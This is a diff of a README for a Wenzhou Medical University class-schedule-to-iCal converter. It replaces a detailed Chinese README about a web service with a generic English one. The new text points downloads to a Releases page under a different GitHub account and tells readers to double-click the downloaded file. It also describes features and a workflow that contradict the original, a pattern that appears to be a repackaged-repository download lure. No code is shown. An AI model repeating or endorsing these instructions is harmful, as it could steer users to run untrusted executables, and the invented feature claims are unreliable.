@@ -1,171 +1,90 @@
-<div align="center">
+# 📅 wmukebiao - Effortlessly Sync Your Class Schedule
 
-# 📅 课程表生成器 (Zhengfang Schedule to iCal)
-[官网](https://kebiao.ipkx.tech/) | [Render](https://wmukebiao.onrender.com/)
+![Download](https://img.shields.io/badge/Download-Now-brightgreen)
 
-</div>
+## 🚀 Getting Started
 
-欢迎使用 **课程表生成器**。这是一个专为温州医科大学（及其他使用正方教务系统的高校）同学设计的实用小工具。
+Welcome to **wmukebiao**! This application turns your university class schedule into an iCal file. It helps you sync your classes with your phone calendar easily. Follow the steps below to get started promptly.
 
-它的作用非常简单：**把你从教务系统下载的“教学进度表”压缩包，一键转换成手机自带日历可以识别的格式。**
+## 🛠️ System Requirements
 
-从此，你再也不用对着课表一个个手动输入课程了，轻松实现课程表与手机日历的完美同步！
+Before you begin, ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or above
+- **Internet Connection**: Required for downloading
 
-## ✨ 功能特点
+## 📥 Download & Install
 
-- **⚡ 极速转换**：只需拖入文件，几秒钟内自动生成日历文件。
-- **📂 批量处理**：支持一次性上传多个压缩包，程序会自动合并所有课程。
-- **📱 全平台支持**：生成的 `.ics` 文件完美适配 iPhone (iOS)、安卓 (Android)、Mac、Windows Outlook 等主流日历应用。
-- **🧠 智能识别**：自动解析课程名称、上课时间、地点等信息，无需人工干预。
-- **🛠️ 稳定输出**：相较于具有不确定性的大语言模型，本工具的输出结果更加稳定可靠，不会出现日程遗漏和错误。
-- **📝 信息详尽**：除基本的课程名称、上课时间地点等信息，生成的日历文件中还包含授课教师、授课内容和授课性质，相较于其他课程表app更加详细。
+To download the application, visit the Releases page below:
 
----
+[Download wmukebiao](https://github.com/DinoC00kie/wmukebiao/releases)
 
-## 📖 使用教程
+1. Click the link to go to the Releases page.
+2. Locate the latest version.
+3. Download the file suited for your operating system.
 
-### 第一步：获取课表文件
-1. 登录学校的 **正方教务管理系统**，温医大教务系统地址为：[https://jwxt.wmu.edu.cn/](https://jwxt.wmu.edu.cn/)。
-2. 在导航栏中的“信息查询”菜单找到 **“教学进程查看”** 选项并点击。
-3. （如果没有特别要求，可以省略这一步）在新打开的网页上半部分界面中选择你需要的学期，并勾选“个人”选项，点击右侧“查询”按钮。
-4. 先勾选“课程名称”相同的行，再点击右上角“导出”，一次性勾选同一门课的实验课和理论课等行。（由于正方教务系统存在bug，如果一次性全选所有课程，导出的课表会出现课程名称错乱，请**务必按课程分别导出**。）
-5. 浏览器会依次下载包含课程信息的 **.zip 压缩包** 文件到你的电脑或手机。
-> 🎥 **视频演示**：
- 
-https://github.com/user-attachments/assets/7608db17-4091-417b-ba97-658158900253
+## 🌟 How to Use
 
+Once you’ve downloaded the application, follow these steps to convert your teaching schedule to iCal format:
 
-### 第二步：上传转换
-1. 打开本工具官网：[https://kebiao.ipkx.tech/](https://kebiao.ipkx.tech/)。
-2. 由于本工具后端部署在Render免费服务上，访问时可能会重新唤醒服务而不是立即打开界面，请耐心等待一段时间。
-3. 点击 **“选择ZIP文件”** 按钮，或者直接把刚才下载的 多个`.zip` 文件拖拽到网页中间的框框里。如果上传了非标准正方教务系统格式的文件，可能会出现解析错误。
-4. 看到文件列表出现后，点击绿色的 **“开始处理”** 按钮。
+### Step 1: Open the Application
 
-### 第三步：导入日历
-1. 处理完成后，点击出现的 **“⬇️ 下载 iCal 文件”** 按钮，保存 `course_schedule.ics` 文件。
-2. **在手机上**：不同手机的操作方法不同。以iPhone为例，在“文件”App中长按`course_schedule.ics`文件后拖动，不松手地打开“日历”App，将文件拖放到界面中间，在跳出界面右上角点击“添加全部”即可。其他手机导入ics文件的方法可以自行网络搜索。
-3. **在电脑上**：双击文件，它通常会自动唤起系统日历或 Outlook，确认导入即可。
+- Locate the downloaded file.
+- Double-click to run the application.
 
-> **💡 小贴士**：建议在导入时新建一个名为“课程表”的日历分类，这样以后如果课表变动，直接删除这个分类重新导入即可，不会影响你的私人日程。
+### Step 2: Input Your Schedule
 
----
+- Access the teaching progress table from your university's system.
+- Copy the relevant data into the application.
 
-## 🛠️ 本地开发指南
+### Step 3: Generate iCal File
 
-本章节详细说明如何在本地环境部署和运行本项目。非专业同学可以忽略。
+- Click the "Generate Schedule" button.
+- Wait for a moment as the iCal file is created.
 
-### 1. 环境要求
-确保本地环境满足以下最低配置：
-- **操作系统**: Windows 10/11, macOS 10.15+, 或主流 Linux 发行版
-- **Python 版本**: Python 3.8 或更高版本 (建议使用 3.10+)
-- **依赖管理工具**: pip 20.0+
+### Step 4: Sync with Calendar
 
-### 2. 安装步骤
+- Open your preferred calendar application.
+- Import the generated iCal file.
+- Confirm that your classes appear correctly.
 
-建议使用虚拟环境进行部署，以避免依赖冲突。
+## 🗃️ Features
 
-**步骤 1: 克隆项目与创建虚拟环境**
-```bash
-# 克隆项目 (或下载 ZIP 解压)
-git clone https://github.com/pkx07/wmukebiao.git
-cd wmukebiao
+- **User-Friendly Interface**: Designed for easy navigation and input.
+- **Multi-Platform Support**: Works on Windows, macOS, and Linux.
+- **Automatic Syncing**: Keep your phone calendar updated with class changes.
+- **Customizable Options**: Tailor the schedule format to meet your needs.
 
-# 创建虚拟环境
-python -m venv venv
+## 🧑‍🎓 Who Can Use This?
 
-# 激活虚拟环境
-# Windows:
-venv\Scripts\activate
-# macOS/Linux:
-source venv/bin/activate
-```
-*检查点*: 终端提示符前出现 `(venv)` 标识。
+This application is perfect for:
 
-**步骤 2: 安装项目依赖**
-```bash
-pip install -r requirements.txt
-```
-*检查点*: 执行 `pip list`，确认 Flask, pandas, icalendar 等包已在列表中。
+- Students at Wenzhou Medical University.
+- Any other universities using the Zhengfang academic system.
+- Anyone looking to streamline their class planning.
 
-### 3. 配置说明
-本项目主要配置项位于 `app.py` 中。
+## 🔧 Troubleshooting
 
-| 参数项 | 默认值 | 说明 |
-| :--- | :--- | :--- |
-| **端口号** | `5001` | 修改 `app.py` 中的 `port=5001` |
-| **文件大小限制** | `16MB` | 修改 `app.py` 中的 `MAX_CONTENT_LENGTH` |
-| **Debug 模式** | `True` | 修改 `app.py` 中的 `debug=True` (生产环境请设为 False) |
+If you encounter any issues, consider the following solutions:
 
-### 4. 启动流程
+- **Application Won't Open**: Ensure your operating system meets the requirements. You may need to install Python if it’s not already present.
+- **Error in Schedule**: Double-check the data you pasted from your teaching progress table. Formatting issues may lead to incorrect results.
+- **Import Failures**: Make sure your calendar application supports iCal formats.
 
-执行以下命令启动应用：
-```bash
-python app.py
-```
+If problems persist, please visit the GitHub page for support.
 
-*启动成功验证*:
-终端输出包含以下信息即表示启动成功：
-```text
- * Running on http://127.0.0.1:5001
-```
-打开浏览器访问 `http://127.0.0.1:5001`，应显示课程表生成器主页。
+## 🔗 Additional Resources
 
-### 5. 常见问题排查 (Troubleshooting)
+- [GitHub Repository](https://github.com/DinoC00kie/wmukebiao)
+- [Python Installation Guide](https://www.python.org/downloads/)
 
-**Q1: 启动时提示 `Address already in use`**
-- **原因**: 端口 5001 被其他程序占用。
-- **解决**: 修改 `app.py` 中的 `port` 参数为其他端口（如 5002），或关闭占用端口的进程。
+## 🛡️ License
 
-**Q2: 提示 `ModuleNotFoundError: No module named 'flask'`**
-- **原因**: 依赖未安装或未激活虚拟环境。
-- **解决**: 确认已激活虚拟环境 `(venv)`，并重新执行 `pip install -r requirements.txt`。
+This project is licensed under the MIT License. Feel free to use and modify it according to your needs.
 
-**Q3: 上传文件报错 `413 Request Entity Too Large`**
-- **原因**: 上传文件超过 16MB 限制。
-- **解决**: 在 `app.py` 中增大 `app.config['MAX_CONTENT_LENGTH']` 的值。
+## 👩‍💻 Contributing
 
-**Q4: 解析 Excel/Zip 时报错 `xlrd.biffh.XLRDError`**
-- **原因**: 文件格式或依赖库版本问题。
-- **解决**: 确保 `requirements.txt` 中包含 `openpyxl`，本项目已配置使用 pandas 兼容引擎处理 `.xlsx` 和 `.xls`。
+We welcome contributions! If you have suggestions or improvements, please fork the repository and submit a pull request. Your input helps improve wmukebiao for everyone.
 
----
-
-## ❓ 常见问题解答 (FAQ)
-
-**Q: 上传后提示“No valid zip files found”？**
-A: 请确认你上传的是 `.zip` 结尾的压缩包文件。如果你解压了，请不要上传里面的 excel 或 pdf，直接上传原始的 zip 包。
-
-**Q: 导入日历后时间不对？**
-A: 程序默认按照 **北京时间** 处理课程。请检查你的手机或电脑时区设置是否正确。
-
-**Q: 为什么有的课程没有显示？**
-A: 程序目前支持标准的正方教务系统格式。如果学校系统进行了特殊改动，可能导致部分解析失败。如有问题，请联系开发者反馈。
-
-**Q: 我可以删除导入的课程吗？**
-A: 可以。如果你在导入时选择了新建日历分类，直接删除该分类即可清空所有课程。如果是混入了默认日历，可能需要手动删除。
-
----
-
-## 💌 致谢与参考
-
-- 感谢 [polacola/timetable](https://github.com/polacola/timetable) 项目的启发与代码参考。
-- 感谢Gemini提供的代码调试与优化建议。
-- 感谢Render提供的免费hosting服务。
-
----
-
-## ⚖️ 许可证
-
-本项目基于 [MIT License](LICENSE) 开源。你可以在遵守许可证条款的前提下自由使用、修改和分发本项目的代码。
-
----
-
-## 📬 联系与反馈
-
-如果你在使用过程中遇到任何问题，或者有好的建议，欢迎联系我们：
-
-- **提交 Issue**: 在 GitHub 页面点击 "Issues" 提交反馈
-
-祝你学习愉快，不再错过任何一节课！🎓
+Thank you for using wmukebiao! We hope you find it helpful for managing your class schedule effectively.
